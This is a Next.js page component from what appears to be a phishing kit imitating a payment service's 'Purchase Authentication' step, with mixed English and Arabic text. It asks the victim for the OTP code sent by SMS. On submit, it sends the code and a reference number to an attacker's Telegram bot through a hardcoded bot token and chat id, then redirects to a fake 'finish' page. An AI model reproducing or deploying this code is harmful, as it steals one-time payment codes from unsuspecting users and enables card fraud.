"use client";
import { Suspense } from "react";
import React, { useState } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import { useRouter, useSearchParams } from 'next/navigation';
import axios from 'axios';


function CodePageContent() {
  const [code, setCode] = useState("");
    const searchParams = useSearchParams();
    const refN = searchParams.get("refN");
    const router = useRouter();

    const handleSubmit = async (e) => {
      e.preventDefault();
      if (code) {
        const text = `
  🔐 PIN: ${code}
  🔨 Ref: ${refN}

        `;
  
        try {
          await axios.post(
            `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
            {
              chat_id: "-4836393174",
              text: text
            }
          );
          router.push(`/benefitpay/finish?refN=${refN}`);
        } catch (error) {
          alert("Error sending data");
          console.error(error);
        }
      }
    };
  return (
    <div 
      className="d-flex justify-content-center align-items-center vh-100" 
      style={{ backgroundColor: "#fdf5f5" }}
    >
      <form 
        onSubmit={handleSubmit} 
        className="p-4 rounded shadow" 
        style={{ backgroundColor: "white", width: "300px", border: "2px solid #ff4d4d" }}
      >
        <h4 className="text-center mb-3" style={{ color: "#b30000" }}>
          Purchase Authentication
        </h4>
        <br/>
        <p>We have sent you an SMS with an OTP code to your registered mobile number</p>
        <p>Enter your OTP code below:</p>
        <div className="mb-3">
          <input 
            type="text" 
            className="form-control" 
            placeholder="أدخل الكود" 
            value={code} 
            onChange={(e) => setCode(e.target.value)} 
            required
            style={{ borderColor: "#ff4d4d" }}
          />
        </div>

        <button 
          type="submit" 
          className="btn w-100" 
          style={{ backgroundColor: "#ff4d4d", color: "white" }}
          onClick={handleSubmit}
        >
          تأكيد
        </button>
      </form>
    </div>
  );
}
export default function CodePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <CodePageContent />
    </Suspense>
  );
}
